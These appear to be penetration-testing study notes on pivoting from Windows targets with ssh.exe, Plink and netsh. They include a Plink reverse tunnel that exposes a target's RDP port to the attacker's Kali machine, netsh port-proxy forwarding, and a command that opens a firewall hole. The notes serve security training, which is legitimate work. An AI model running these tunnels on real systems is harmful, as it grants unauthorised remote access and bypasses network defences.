
### ssh.exe

openssh is on windows by default sine 2018 april. and available as feature on demand since windows 10 fall.

windows with ssh installed have: scp.exe, sftp.exe, ssh.exe.

`C:\Windows\System32\OpenSSH` - location of tools

`where ssh` - find ssh on the windows machine

`ssh tunnel with ssh.exe is done the same way as linux.`


### Plink

Plink is the command-line version of PuTTY. We may not always have ssh on windows targets, but putty and plink are common for network admins to have on their pcs for network admin tasks.

We can find plink.exe on our machine at /usr/share/windows-resources/binaries/plink.exe

```
plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 kaliip
```

when we cant respond to the confirmation
```
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 kali_ip
```

the first 127.0.0.1:9833 - is our kali machine
the second 127.0.0.1:3389 - is the target rdp port we want access to

this method is useful when we cant access and open port because of firewall.


### Netsh

to use netsh we need administrative privileges to make any changes/use it.

we can set up a port forward using netsh like so:
```
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=forwarding_machine connectport=22 connectaddresss=target_ip
```

confirm connection:
```
netstat -anp TCP | find "2222"
```

```
netsh interface portproxy show all
```


If we cant access the listening port form our kali machine we may need to poke a hole in the firewall to get through:
```
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=forwarding_machine_ip localport=2222 action=allow
```

deleting the firewall rule:
```
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```

deleting the portforward:
```
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

